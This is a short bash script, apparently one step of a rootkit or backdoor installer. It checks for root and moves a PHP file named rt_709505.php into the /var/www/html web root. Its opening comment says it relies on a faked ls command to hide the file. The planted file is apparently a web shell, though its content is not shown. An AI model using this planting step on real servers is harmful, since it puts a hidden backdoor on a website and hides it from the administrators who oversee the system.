# relies on false ls to hide
if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

if [[ -d /var/www/html ]]; then
    mv ./rt_709505.php /var/www/html
fi
